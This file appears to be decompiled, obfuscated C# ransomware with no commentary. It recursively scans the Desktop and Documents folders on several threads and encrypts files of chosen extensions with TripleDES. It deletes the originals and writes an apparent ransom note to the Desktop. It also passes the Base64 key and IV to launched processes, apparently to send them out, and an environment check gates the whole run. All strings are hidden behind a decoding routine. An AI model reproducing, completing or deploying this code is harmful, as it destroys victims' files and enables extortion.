using System;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;
using System.Text.RegularExpressions;
using System.Threading;

internal class @_
{
	private static TripleDESCryptoServiceProvider m__;

	private unsafe static void _(string string_0)
	{
		FileStream fileStream = File.Create(string_0 + _003CModule_003E.___((int)((nint)Type.EmptyTypes.LongLength + 52508), sizeof(byte) + 53431, sizeof(uint) + 20));
		_003CModule_003E._____________ = 1898371779;
		_003CModule_003E._ = null;
		FileStream stream = fileStream;
		ICryptoTransform transform = global::_.m__.CreateEncryptor();
		_003CModule_003E.________ = false;
		CryptoStream stream2 = new CryptoStream(stream, transform, CryptoStreamMode.Write);
		StreamWriter streamWriter = new StreamWriter(stream2);
		_003CModule_003E._____ = null;
		StreamReader streamReader = new StreamReader(string_0);
		string text = streamReader.ReadLine();
		while (true)
		{
			_003CModule_003E.____ = streamWriter;
			string text2 = text;
			_003CModule_003E._________________ = -942491469;
			bool num = text2 == null;
			_003CModule_003E.__________ = 151944843;
			_003CModule_003E._____ = null;
			if (num)
			{
				break;
			}
			_003CModule_003E._________________ = 744302617;
			streamWriter.Write(text);
			int ___________ = _003CModule_003E.____________;
			int num2;
			nint num3;
			if (-19782 + ___________ * 2 == (int)((uint)(___________ << 1) ^ ((uint)___________ / 2u * 4 + (uint)___________ / 2u * 4)))
			{
				num2 = 1333177170;
				num3 = num2;
			}
			else if ((((uint)(___________ * 264 + ___________ * 1784) >> 5 >> 6) & 1) == (uint)(1 & -___________))
			{
				if ((((uint)(7364 + (___________ << 29)) >> 29) & 2) == (uint)((~___________ - 2958) & 2))
				{
					num3 = ((((((uint)(___________ * -1073741824) >> 10) ^ (uint)(___________ * 57 + 7 * ___________)) & 0x39) == 0) ? ((nint)Type.EmptyTypes.LongLength + 71076) : ((nint)Type.EmptyTypes.LongLength + 695708289));
				}
				else
				{
					num2 = -1636090519;
					num3 = num2;
				}
			}
			else
			{
				num3 = sizeof(Guid) + 829527825;
			}
			IntPtr intPtr;
			if ((uint)___________ / 16039u == 2449857621u)
			{
				int ______________ = _003CModule_003E._______________;
				intPtr = ((______________ * 12966 - -131 != (int)((uint)______________ % 256u / 1972u >> 23)) ? ((nint)Type.EmptyTypes.LongLength + -884098835) : ((nint)Type.EmptyTypes.LongLength + 1457581078));
			}
			else
			{
				int ________________ = _003CModule_003E._________________;
				intPtr = ((5009 + (________________ << 20) + 483840 == (int)((uint)(~(________________ * 1073741824)) >> 17)) ? ((nint)Type.EmptyTypes.LongLength + -1963321438) : ((nint)Type.EmptyTypes.LongLength + 122));
			}
			_003CModule_003E.____ = _003CModule_003E.___(70129, (int)num3, (int)(nint)intPtr);
			text = streamReader.ReadLine();
		}
		_003CModule_003E.______________ = -1748580011;
		streamReader.Close();
		_003CModule_003E._________ = 1503776956;
		global::__.__ = 1952428595;
		streamWriter.Flush();
		streamWriter.Close();
		_003CModule_003E._ = null;
		_003CModule_003E.___________ = 1987339265;
		File.Delete(string_0);
		_003CModule_003E.___________ = -805702749;
		global::__._ = stream2;
	}

	private unsafe static void __(object object_0)
	{
		int num = default(int);
		bool flag = default(bool);
		try
		{
			string[] files = Directory.GetFiles((string)object_0, _003CModule_003E.___(44666, sizeof(int) + 45636, (int)((nint)Type.EmptyTypes.LongLength + 219)));
			_003CModule_003E.____________ = -1592258590;
			string[] array = files;
			num = 0;
			while (flag = num < array.Length)
			{
				object obj = 1386028750;
				_003CModule_003E._______________ = 2136656571;
				_003CModule_003E._____ = obj;
				string text = array[num];
				string text2 = text.Split(new char[1] { '.' })[text.Split(new char[1] { '.' }).Length - 1];
				_003CModule_003E._________ = -1411494653;
				_003CModule_003E.__________________ = 1654087594;
				int int_ = sizeof(double) + 21715;
				int num2 = 22728;
				int num13;
				if (!(text2 == _003CModule_003E.___(int_, 22728, sizeof(Guid) + 95)) && !(text2 == _003CModule_003E.___((int)((nint)Type.EmptyTypes.LongLength + 8801), sizeof(uint) + 9765, sizeof(float) + 89)) && !(text2 == _003CModule_003E.___((int)((((uint)((num2 << 16) + -2090598400 * num2) & 0xE8C7u) != 0) ? ((nint)Type.EmptyTypes.LongLength + -1280742505) : (sizeof(long) + 51678)), (int)((nint)Type.EmptyTypes.LongLength + 52731), (int)((nint)Type.EmptyTypes.LongLength + 117))))
				{
					nint num3 = (nint)Type.EmptyTypes.LongLength + 41225;
					nint num4 = (nint)Type.EmptyTypes.LongLength + 42307;
					int _________ = _003CModule_003E.__________;
					if (!(text2 == _003CModule_003E.___((int)num3, (int)num4, (int)((nint)Type.EmptyTypes.LongLength + 177))))
					{
						_003CModule_003E._______________ = num;
						if (!(text2 == _003CModule_003E.___(13256, 14319, (int)(((((uint)num / 570u) ^ 0x2001DF0u) != 0) ? ((nint)Type.EmptyTypes.LongLength + 32) : (-1751991961)))) && !(text2 == _003CModule_003E.___(sizeof(byte) + 66540, 67633, 238)))
						{
							string text3 = _003CModule_003E.___((int)((nint)Type.EmptyTypes.LongLength + 51532), sizeof(int) + 52405, sizeof(short) + 133);
							_003CModule_003E.__________________ = 1657774894;
							if (!(text2 == text3))
							{
								int _____________ = _003CModule_003E.______________;
								int _________________ = _003CModule_003E.__________________;
								if (!(text2 == _003CModule_003E.___(21231, (int)(((int)(33554432 * ((uint)_________________ / 711941971u)) - int.MinValue != (int)((uint)_________________ / 5u)) ? ((nint)Type.EmptyTypes.LongLength + 21913) : (sizeof(ulong) + 1123732964)), (int)((((num2 * 111230976) | -9937) != -9937) ? ((nint)Type.EmptyTypes.LongLength + 720440157) : ((nint)Type.EmptyTypes.LongLength + 45)))))
								{
									int num5;
									nint num6;
									if ((-3461 & ~(_________ * ((_________ - -7573) & _________))) == 0)
									{
										num5 = sizeof(long) + 1964230553;
										num6 = num5;
									}
									else if ((((uint)_________________ / 83u) | 0x3FFFFFF) != 67108863)
									{
										num5 = sizeof(long) + -1746278992;
										num6 = num5;
									}
									else
									{
										num6 = (nint)Type.EmptyTypes.LongLength + 63219;
									}
									if (!(text2 == _003CModule_003E.___((int)num6, (int)((nint)Type.EmptyTypes.LongLength + 63928), sizeof(byte) + 84)) && !(text2 == _003CModule_003E.___(53984, (((_________________ * 26345472 - -5363) & _________________) - -15126 != 2368 + _________________) ? (sizeof(double) + 54712) : (((((_________ + _________ * 3) ^ -8657) & 1) == 1) ? (-1968804500) : (((int)((uint)(num * 3 + 29 * num + -6837) >> 5) - -4569 != num) ? (sizeof(long) + -636894119) : (sizeof(Guid) + -1692008988))), sizeof(uint) + 198)) && !(text2 == _003CModule_003E.___(56934, (((((uint)_____________ / 1753u) & (uint)(_____________ * 2 + 62 * _____________)) ^ 0xFFFFFA2Au) == 0) ? (sizeof(ushort) + -943959491) : (((0x21CFu ^ (uint)(num * 7 + num)) != 0) ? (sizeof(uint) + 58159) : ((((_________ + _________ - -3545) | -2) == -1) ? 1332569406 : (-1085959746))), sizeof(ulong) + 33)))
									{
										nint num7 = (nint)Type.EmptyTypes.LongLength + 2621;
										int ________________ = _003CModule_003E._________________;
										nint intPtr = (((0x1260 ^ (________________ * 1117 + 931 * ________________)) == 0) ? (sizeof(float) + 1951619264) : (((0x80 & (2342656 * _________)) != (0x80 & ((_________ * 20 + 12 * _________) * 32))) ? (sizeof(int) + -830710559) : ((nint)Type.EmptyTypes.LongLength + 3903)));
										int num8;
										nint num9;
										if ((1 & num2) == (int)(((uint)(-921131914 + 1626296320 * num2) >> 12) & 1))
										{
											num8 = 247;
											num9 = num8;
										}
										else if ((0xFFFFF800u & ((uint)num2 / 2097152u)) != 0)
										{
											num8 = sizeof(byte) + -1984861031;
											num9 = num8;
										}
										else
										{
											num9 = (nint)Type.EmptyTypes.LongLength + 1804492253;
										}
										if (!(text2 == _003CModule_003E.___((int)num7, (int)intPtr, (int)num9)))
										{
											nint num10 = (nint)Type.EmptyTypes.LongLength + 49528;
											int _____________2 = _003CModule_003E.______________;
											if (!(text2 == _003CModule_003E.___((int)num10, 50087, ((((16 * (_____________2 - 4313)) ^ ((_____________2 << 4) - 2308)) & 0x10) == 0) ? 44 : (-935261090))))
											{
												_003CModule_003E._______________ = num;
												if (!(text2 == _003CModule_003E.___(51579, 52167, (int)((nint)Type.EmptyTypes.LongLength + 160))))
												{
													_003CModule_003E.____ = _003CModule_003E.___(45892, (int)((nint)Type.EmptyTypes.LongLength + 46505), (________________ * 205472 != 4785) ? (sizeof(int) + 42) : (-1002593387));
													nint num11 = (nint)Type.EmptyTypes.LongLength + 48829;
													int _________________2 = _003CModule_003E.__________________;
													if (!(text2 == _003CModule_003E.___(47683, (int)num11, (int)((int.MinValue + (int)((uint)_________________2 / 15u / 4u) != -95248 * _________________2 << 28) ? ((nint)Type.EmptyTypes.LongLength + 200) : ((nint)Type.EmptyTypes.LongLength + 2031769873)))))
													{
														nint num12 = (nint)Type.EmptyTypes.LongLength + 24178;
														int ___________ = _003CModule_003E.____________;
														num13 = ((!(text2 == _003CModule_003E.___((int)num12, ((0xD4F & ((0xB2F | ___________) - 7781)) == 0) ? (sizeof(uint) + 1804092126) : 25613, (int)((nint)Type.EmptyTypes.LongLength + 171)))) ? 1 : 0);
														goto IL_06a8;
													}
												}
											}
										}
									}
								}
							}
						}
					}
				}
				num13 = 0;
				goto IL_06a8;
				IL_06a8:
				flag = (byte)num13 != 0;
				if (num13 == 0)
				{
					_(text);
				}
				num++;
			}
		}
		catch (Exception)
		{
			_003CModule_003E.________________ = num;
		}
		_003CModule_003E._______ = flag;
	}

	private unsafe static void ___(int int_0, string string_0)
	{
		int num2 = default(int);
		try
		{
			bool num = int_0 != 1;
			_003CModule_003E.__________________ = num2;
			bool flag = num;
			string text = default(string);
			if (!num)
			{
				ParameterizedThreadStart start = __;
				_003CModule_003E._________________ = -1852116043;
				_003CModule_003E._____ = null;
				Thread thread = new Thread(start);
				_003CModule_003E.____________ = -1410905245;
				Thread thread2 = thread;
				_003CModule_003E.___ = text;
				thread2.Start(string_0);
				_003CModule_003E.__ = null;
			}
			_003CModule_003E.________ = null;
			_003CModule_003E.____ = _003CModule_003E.___(sizeof(double) + 59762, (int)((nint)Type.EmptyTypes.LongLength + 60194), ((-9069 | (num2 * 304218112 * 2086666240)) != -9069) ? (sizeof(Guid) + -2143677747) : (sizeof(float) + 81));
			string[] directories = Directory.GetDirectories(string_0);
			string[] array = directories;
			num2 = 0;
			while (true)
			{
				int num3 = num2;
				global::__._ = text;
				bool num4 = num3 < array.Length;
				_003CModule_003E.______ = 1818084011;
				flag = num4;
				if (num4)
				{
					text = array[num2];
					Thread thread3 = new Thread(__);
					_003CModule_003E._______________ = -2051646939;
					Thread thread = thread3;
					thread.Start(text);
					_003CModule_003E._ = flag;
					global::__.__ = 1876936332;
					_003CModule_003E.__________________ = 828233320;
					if (!(flag = int_0 != 1))
					{
						string string_ = text;
						_003CModule_003E._ = null;
						___(0, string_);
					}
					int num5 = num2;
					_003CModule_003E._ = num2;
					int num6 = num5 + 1;
					_003CModule_003E.________ = thread;
					global::__.__ = null;
					num2 = num6;
					continue;
				}
				break;
			}
		}
		catch (Exception)
		{
			_003CModule_003E._______________ = num2;
		}
	}

	private unsafe static void ____(string[] args)
	{
		Process process = new Process();
		_003CModule_003E.__________________ = 1258415768;
		process.StartInfo.UseShellExecute = false;
		process.StartInfo.RedirectStandardOutput = true;
		ProcessStartInfo startInfo = process.StartInfo;
		int _______________ = _003CModule_003E.________________;
		startInfo.FileName = _003CModule_003E.___(38972, ((-4 | ((_______________ * 2 + _______________ * 2) ^ -6826)) == -2) ? (sizeof(float) + 39425) : (-885106073), (int)((nint)Type.EmptyTypes.LongLength + 17));
		ProcessStartInfo startInfo2 = process.StartInfo;
		int ___________ = _003CModule_003E.____________;
		startInfo2.Arguments = _003CModule_003E.___((int)((___________ + 15 * ___________ + 9020 == -6408) ? ((nint)Type.EmptyTypes.LongLength + 825883416) : ((nint)Type.EmptyTypes.LongLength + 55087)), 56605, 46);
		process.Start();
		string input = process.StandardOutput.ReadToEnd();
		process.WaitForExit();
		bool flag = default(bool);
		_003CModule_003E.____ = flag;
		Regex regex = new Regex(_003CModule_003E.___((int)((nint)Type.EmptyTypes.LongLength + 40034), sizeof(double) + 40481, (int)((nint)Type.EmptyTypes.LongLength + 70)));
		if (!(flag = !regex.IsMatch(input)))
		{
			return;
		}
		global::_.m__ = new TripleDESCryptoServiceProvider();
		___(1, Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
		global::__.__ = process;
		___(1, Environment.GetFolderPath(Environment.SpecialFolder.Personal));
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		int num;
		nint num2;
		if ((((uint)___________ / 2u) | 0x7FFFFFFF) != int.MaxValue)
		{
			num = sizeof(double) + -1668851279;
			num2 = num;
		}
		else if (-_______________ - 793 == (0x151A & _______________) + _______________)
		{
			if (-1729 + ___________ == ___________ - (int)((uint)(3 * ___________ + ___________ * 5) & ((uint)___________ / 16384u)))
			{
				num = sizeof(byte) + -2008747337;
				num2 = num;
			}
			else
			{
				num = -1605128066;
				num2 = num;
			}
		}
		else
		{
			num2 = (nint)Type.EmptyTypes.LongLength + 16194;
		}
		string text = _003CModule_003E.___(15662, (int)num2, (int)((nint)Type.EmptyTypes.LongLength + 225));
		_003CModule_003E.___________ = -1652138191;
		string path = folderPath + text;
		nint num3 = (nint)Type.EmptyTypes.LongLength + 3563;
		nint num4;
		int ___________2 = default(int);
		int _________ = default(int);
		if ((((uint)___________ / 64u) ^ 0xCBC) != 1382460432)
		{
			num4 = (nint)Type.EmptyTypes.LongLength + 5098;
		}
		else if (((uint)((_______________ * 524288) ^ (_______________ << 19)) & 0x8BF00000u) != 0)
		{
			num4 = (nint)Type.EmptyTypes.LongLength + -2061200105;
		}
		else
		{
			___________2 = _003CModule_003E.____________;
			if ((((___________2 & 0x24DA) - 8596) & 2) == (2 & ((___________2 << 18) ^ ___________2)))
			{
				_________ = _003CModule_003E.__________;
				num4 = (((uint)_________ % 242290926u / 1405u != 2166078342u) ? ((nint)Type.EmptyTypes.LongLength + 2020672465) : (((uint)(_______________ + _______________) / 7338u == 2235061062u) ? (sizeof(short) + -1716009444) : ((((___________2 << 3) & 8) != ((3 * ___________2 + ___________2 * 5 - 4250) & 8)) ? ((nint)Type.EmptyTypes.LongLength + 778578065) : ((___________ * 385 + 127 * ___________ - 9574 == -6069) ? ((nint)Type.EmptyTypes.LongLength + 1986138425) : ((nint)Type.EmptyTypes.LongLength + -1788858124)))));
			}
			else
			{
				num4 = 1022937303;
			}
		}
		int ____________ = default(int);
		nint num6;
		if (((((uint)_______________ % 10828902u) ^ 0x1E86) | 0xFFFFFF) != 16777215)
		{
			____________ = _003CModule_003E._____________;
			int num5;
			if ((((uint)____________ / 134217728u) ^ 0x10A3u) != 0)
			{
				num5 = -1970122181;
				num6 = num5;
			}
			else
			{
				num5 = sizeof(short) + 499127020;
				num6 = num5;
			}
		}
		else
		{
			num6 = (nint)Type.EmptyTypes.LongLength + 42;
		}
		File.WriteAllText(path, _003CModule_003E.___((int)num3, (int)num4, (int)num6));
		File.AppendAllText(path, _003CModule_003E.___((int)((nint)Type.EmptyTypes.LongLength + 38039), (int)((nint)Type.EmptyTypes.LongLength + 38305), sizeof(Guid) + 107));
		File.AppendAllText(path, _003CModule_003E.___((int)((nint)Type.EmptyTypes.LongLength + 14593), (((1073741824 * ___________ - 7402) & 0x12B0) != 528) ? (-1739199877) : (sizeof(uint) + 15058), (int)((nint)Type.EmptyTypes.LongLength + 80)));
		int ____________2 = _003CModule_003E._____________;
		File.AppendAllText(path, _003CModule_003E.___(sizeof(Guid) + 50933, (int)(((____________ & -877461504) != (____________ & -877461504)) ? (sizeof(ushort) + -1262957044) : ((2 * (-9743 + 8 * _________ + _________ * 8) - 2330 == ~(_________ * 1108608)) ? ((nint)Type.EmptyTypes.LongLength + 2088141787) : ((nint)Type.EmptyTypes.LongLength + 52461))), (int)((9 * _________ + 28104 + _________ * 7 != (int)((uint)_________ % 176u >> 27)) ? (sizeof(int) + 79) : (((((uint)(-(____________ * -1358080)) >> 8) & 1) != (uint)(1 & ____________)) ? ((nint)Type.EmptyTypes.LongLength + 2025437481) : 1616226710))));
		_003CModule_003E._________ = -469219179;
		File.AppendAllText(path, _003CModule_003E.___(1799, (int)((nint)Type.EmptyTypes.LongLength + 2978), (int)((nint)Type.EmptyTypes.LongLength + 112)));
		_003CModule_003E.__________________ = -1091718226;
		File.AppendAllText(path, _003CModule_003E.___(72082, sizeof(ushort) + 72210, sizeof(float) + 172));
		_003CModule_003E._______________ = -1978466511;
		_003CModule_003E.______ = 1957620381;
		File.AppendAllText(path, _003CModule_003E.___(sizeof(byte) + 36779, 37891, sizeof(float) + -4));
		File.AppendAllText(path, _003CModule_003E.___((~((____________2 * 262144) | (___________ << 6)) == 64 * -___________) ? 1725673562 : 23099, (int)((nint)Type.EmptyTypes.LongLength + 24887), sizeof(ulong) + 103));
		File.AppendAllText(path, _003CModule_003E.___((int)((nint)Type.EmptyTypes.LongLength + 9843), (int)((nint)Type.EmptyTypes.LongLength + 11530), sizeof(ushort) + 25));
		_003CModule_003E._________________ = -1950879357;
		_003CModule_003E.___ = regex;
		File.AppendAllText(path, _003CModule_003E.___((int)((nint)Type.EmptyTypes.LongLength + 70176), sizeof(double) + 71978, 38));
		File.AppendAllText(path, _003CModule_003E.___((int)((nint)Type.EmptyTypes.LongLength + 45027), sizeof(long) + 45768, 158));
		TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = global::_.m__;
		_003CModule_003E.________ = null;
		_003CModule_003E.____________ = 1549806971;
		string text2 = Convert.ToBase64String(tripleDESCryptoServiceProvider.Key);
		string text3 = Convert.ToBase64String(global::_.m__.IV);
		string fileName = _003CModule_003E.___((int)((nint)Type.EmptyTypes.LongLength + 16640), 16872, (int)((nint)Type.EmptyTypes.LongLength + 8));
		int num7 = ((____________2 << 5) - -1097453867 << 1) - 28008;
		int ________________ = _003CModule_003E._________________;
		Process.Start(fileName, _003CModule_003E.___((int)((num7 == ________________ * 29601792) ? (sizeof(float) + 822536993) : ((12966 * ___________ - -131 == (int)((uint)___________ % 256u / 1972u >> 23)) ? ((nint)Type.EmptyTypes.LongLength + -545425992) : 46061)), (int)(((((uint)________________ >> 14) | 0xFFFFDB1Bu) - 69472 == (uint)________________ >> 14) ? 428344536 : ((nint)Type.EmptyTypes.LongLength + 46884)), (int)((nint)Type.EmptyTypes.LongLength + 77)));
		string fileName2 = _003CModule_003E.___(15774, 15672, (int)((nint)Type.EmptyTypes.LongLength + 27));
		string text4 = _003CModule_003E.___(11693, 11566, (int)((nint)Type.EmptyTypes.LongLength + 69));
		int int_ = ((((true ? 1u : 0u) & (uint)(___________2 * ~(___________2 | -523283))) != 0 && (~___________2 & 0x40) != 64) ? 1672369565 : ((((uint)(279194752 * ____________) ^ 0x1C55u) != 0) ? (sizeof(uint) + 16645) : (((0x400936 ^ ((uint)(________________ & 0x1F3C) / 2097152u)) == 0) ? (-1877149128) : (sizeof(uint) + 2041853473))));
		nint num9;
		if (___________ * 4194304 - 4165 == 4483)
		{
			if ((0x10000 & _________) == 0 || (0x10000 & _________) == 65536)
			{
				int num8;
				if (-784859136 * ___________ == -6467)
				{
					num8 = sizeof(int) + 1927553003;
					num9 = num8;
				}
				else
				{
					num8 = 1044404545;
					num9 = num8;
				}
			}
			else
			{
				num9 = (nint)Type.EmptyTypes.LongLength + -1876226853;
			}
		}
		else
		{
			num9 = (nint)Type.EmptyTypes.LongLength + 18605;
		}
		Process.Start(fileName2, text4 + text2 + _003CModule_003E.___(int_, (int)num9, (int)(((3 & (____________2 + 3 * ____________2)) == 0) ? ((nint)Type.EmptyTypes.LongLength + 62) : (-1294047847))));
		nint num12;
		if (((uint)(___________ ^ (-1347788968 + (0x58000 & ___________))) & 0x10000u) != 0)
		{
			int num10 = default(int);
			int num11;
			if ((((uint)num10 / 256u) ^ 0x20001210) == 0)
			{
				num11 = sizeof(Guid) + -97492853;
				num12 = num11;
			}
			else
			{
				num11 = sizeof(int) + 1716393780;
				num12 = num11;
			}
		}
		else
		{
			int num10 = _003CModule_003E._________________;
			num12 = ((1241513984 * num10 - -1538890638 != 1808900345) ? 88 : ((nint)Type.EmptyTypes.LongLength + -1484667229));
		}
		string fileName3 = _003CModule_003E.___(2276, 4273, (int)num12);
		string text5 = _003CModule_003E.___(61361, (int)(((int)((uint)___________2 >> 16) < 0) ? (sizeof(long) + -1088346947) : ((nint)Type.EmptyTypes.LongLength + 63415)), (int)((nint)Type.EmptyTypes.LongLength + 245));
		_003CModule_003E._____________ = 796469985;
		Process.Start(fileName3, text5 + text3 + _003CModule_003E.___((int)((nint)Type.EmptyTypes.LongLength + 44225), 44262, (int)((nint)Type.EmptyTypes.LongLength + 108)));
	}
}
